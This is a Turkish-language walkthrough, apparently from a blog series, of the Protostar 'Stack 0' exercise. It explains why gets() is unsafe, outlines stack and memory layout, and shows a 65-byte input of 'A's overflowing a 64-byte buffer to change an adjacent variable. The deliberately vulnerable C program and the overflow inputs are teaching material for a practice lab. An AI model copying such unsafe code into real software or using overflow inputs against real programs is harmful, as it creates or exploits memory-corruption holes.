---
title: "Stack 0"
etiketler: "Protostar"
seriler: "Protostar"
sakla  : false
---

## Stack0.c
``` C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    modified = 0;
    gets(buffer);

    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```

**Amaç:** "you have changed the 'modified' variable" satırını yazdırmak.

İstediğimiz cümleyi yazdırabilmemiz için programın akışını değiştirilebilmemiz
gerekiyor. Bunun için bir yukarıdaki if koşulunun sağlanması gerekmekte, bunun
içinde *modified* değişkeninin yukarıda tanımlanan 0 değerinden başka bir değere
sahip olması gerekmekte.

## Programın çalıştırılması

``` shell
user@protostar:/opt/protostar/bin$ ./stack0
Merhaba
Try again?
```

Programmı çalıştırdığım zaman *gets()* fonksiyonuyla kullanıcıdan stdin'den
değer aldığını daha sonra *modified* değişkeni hala 0 olduğu için "Try again?"
mesajını yazdırdığını görüyoruz.

## gets() Fonsiyonundaki Sorun
Burada *gets()* fonksiyonuna dikkat etmek gerekiyor. Eğer man sayfalarını
kontrol edecek olursak.

_Never use gets().  Because it is impossible to tell without knowing the data in_
_advance how many characters gets() will read, and because  gets()  will_
_continue to store characters past the end of the buffer, it is extremely_
_dangerous to use.  It has been used to break computer security._

Yani gets() fonksiyonu stack frame'e istediğimiz gibi doldurabilmemize olanak
sağlıyor. Burada stack frame ile kast edilen şey programdaki fonksiyonları lokal
değişkenleri stack içerisinde atılır ve her fonksiyonun kendine ait bir stack
frame'i bulunur. Böylece program içerisindeki fonksiyonlar birbirlerinin
değişkenlerine erişemezler. -Global değişkenler bundan farklı olarak adresleri
ile çağırılırlar ve bu değişkenler stack veya heap dışında *Data Section*
tutulur.

## Çalıştırılabilir dosyanın bölümleri

* Code (Text)
* Data
* Stack
* Heap

**Code (Text):** Basitçe makina kodlarının bulunduğu bölüm.

**Data:** Global ve statik değişken adreslerinin bulunduğu bölüm.

**Stack:** Lokal değişkenlerin bulunduğu bölüm. Belleğin sonundan *Data* kısmına
doğru büyür. -Stack pointerin adresi küçülür-

**Heap:** Dinamik değişkenlerin bulunduğu bölüm. Data bölümünden belleğin alt
kısımlarına doğru büyür.

## Modified Değişkenini Değiştirilmesi
Yukarıdaki bilgiler doğrultusunda gets() fonksiyonunu kullanarak aynı stack
frame'de bulunan modified değişkenini değiştirebiliriz. Bunu yapmak aslında
çok kolay. Programa input verirken *buffer[64]*'ı doldurduktan sonra yazmaya
devam etmemiz yeterli.

----
İstediğim kadar harf üretebilmek için python'dan yardım alıyorum

``` shell
user@protostar:/opt/protostar/bin$ python -c "print('A'*64)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
----
64 tane A verdiğimiz zaman ilk seferde çalıştırdığımdaki çıktıyı görüyorum bu
zaten buffer dolduğu fakat modified değişkeni değişmediği için beklenilen sonuç.

``` shell
user@protostar:/opt/protostar/bin$ ./stack0 #64 Tane A
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try again?
```

----
Buffer dolduktan hemen sonra modified (int) değişkeni(4 byte) olduğu için sadece
tek bir byte'ını değiştirmem yetti.
``` shell
user@protostar:/opt/protostar/bin$ ./stack0 #65 Tane A
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
```

----
Eğer buffer ve 4byte'lık modified değişkenini değiştirdikten sonra yazmaya devam
edersek "Segmentation fault" denilen hata ile karşılaşırız. *Segmentation Fault*
programın kendi hafıza alanının dışındaki bir adrese erişmeye çalıştığı zaman
işletim sistemi tarafından döndürülen bir hatadır.
``` shell
user@protostar:/opt/protostar/bin$ ./stack0 #100 Tane A
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
Segmentation fault
```
